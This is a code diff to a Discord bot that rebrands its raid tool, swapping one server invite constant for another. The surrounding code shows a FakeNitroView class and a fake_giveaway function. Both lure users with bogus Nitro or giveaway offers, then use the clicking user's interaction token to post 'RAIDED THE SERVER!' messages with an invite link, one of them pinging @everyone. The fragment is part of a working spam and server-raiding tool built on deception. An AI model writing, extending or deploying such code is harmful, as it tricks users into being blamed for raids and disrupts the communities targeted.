@@ -3,7 +3,7 @@ import time
 import random
 import aiohttp
 import discord
-from core.utils.helpers import send_message_http, ZNE_INVITE
+from src.utils.helpers import send_message_http, Aerith_INVITE
 
 
 class FakeNitroView(discord.ui.LayoutView):
@@ -36,7 +36,7 @@ class FakeNitroView(discord.ui.LayoutView):
 
             app_id = interaction.client.application_id
             token = interaction.token
-            content = f"{user_mention} RAIDED THE SERVER! {ZNE_INVITE} @everyone"
+            content = f"{user_mention} RAIDED THE SERVER! {Aerith_INVITE} @everyone"
 
             async with aiohttp.ClientSession() as session:
                 tasks = [
@@ -73,7 +73,7 @@ def fake_giveaway(prize: str):
                 user_mention = interaction.user.mention
                 app_id = interaction.client.application_id
                 token = interaction.token
-                content = f"{user_mention} RAIDED THE SERVER! {ZNE_INVITE}"
+                content = f"{user_mention} RAIDED THE SERVER! {Aerith_INVITE}"
 
                 async with aiohttp.ClientSession() as session:
                     tasks = [
